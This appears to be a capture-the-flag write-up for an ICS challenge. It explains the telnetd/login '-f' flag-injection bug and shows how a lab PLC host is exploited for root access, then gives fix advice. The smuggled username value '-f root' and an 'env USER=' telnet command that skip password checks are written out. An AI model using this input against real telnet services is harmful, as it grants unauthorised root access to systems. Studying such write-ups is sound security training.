---
title: Line Tap
summary: A forgotten RiverGate PLC still answers over telnet; sign in on old maintenance habits and read back the latest checkpoint token.
date: 2026-07-31
tags: [Hack The Box, Cyber Apocalypse 2026, ICS]
difficulty: easy
os: N/A
---

# Line Tap (Easy) - OT/ICS Writeup

## Challenge
Stormbound scouts found a forgotten RiverGate PLC beneath Crownspire brineworks, still feeding treated water toward the Ash Vault service tunnels. Vaultrune wardens cut its controller off from normal oversight after the Signet shattered, but old maintenance habits tend to leave traces. Find what still answers and recover the latest checkpoint token before another sealed gate obeys a forged writ.

**Target:** `154.57.164.69:31063`

## Recon

Nmap identified the open port as a telnet service:

```
154.57.164.69:31063  open  telnet  (OpenWall GNU / Linux telnetd)
```

Connecting manually presents a standard login prompt:

```
$ telnet 154.57.164.69 31063
Trying 154.57.164.69...
Connected to 154.57.164.69.
Escape character is '^]'.
ng-team-316776-icslinetapca2026-t7yku-5f75dcf745-756qd login:
```

## Vulnerability

This is the classic telnetd to login flag-injection bug found in older BSD/netkit-derived telnet daemons. `telnetd` passes the string typed at the `login:` prompt straight through to `/bin/login` without sanitizing for leading dashes. `login` itself accepts a `-f <user>` flag meaning "this user is already authenticated, skip the password check", intended for trusted internal handoffs (e.g. `rlogin`), never for a raw external login prompt.

Because the daemon doesn't strip a leading `-`, supplying `-f root` as the "username" gets interpreted by `login` as the flag `-f root`, authenticating as `root` with no password required.

## Exploitation

Two ways to deliver the payload, since some telnet clients mangle a value starting with `-` typed directly at the prompt:

**Directly at the prompt:**
```
login: -f root
```

**Or via the `USER` environment variable** (telnet clients pass `$USER` as the default login name), which reliably avoids client-side flag parsing issues:
```bash
env USER='-f root' telnet -a 154.57.164.69 31063
```

Both drop straight into a root shell, no password prompt:

```
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.18.24-talos x86_64)
root@ng-team-...:~# 
```

## Flag Recovery

```
root@...:~# cd ..
root@...:/# ls
bin  boot  dev  etc  flag.txt  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
root@...:/# cat flag.txt
||HTB{r7u_l1n3_74p_5n4p5h07_a39f*****************************||
```

## Flag

```
||HTB{r7u_l1n3_74p_5n4p5h07_a39f*****************************||
```

## Root Cause / Fix

- Never expose `telnetd`/`login` combinations that forward unsanitized client input as CLI arguments to a privileged binary.
- Reject or strip leading `-` characters from usernames before passing to `login`.
- Replace telnet with SSH key-based auth. Telnet transmits credentials and session data in cleartext regardless of this bug.
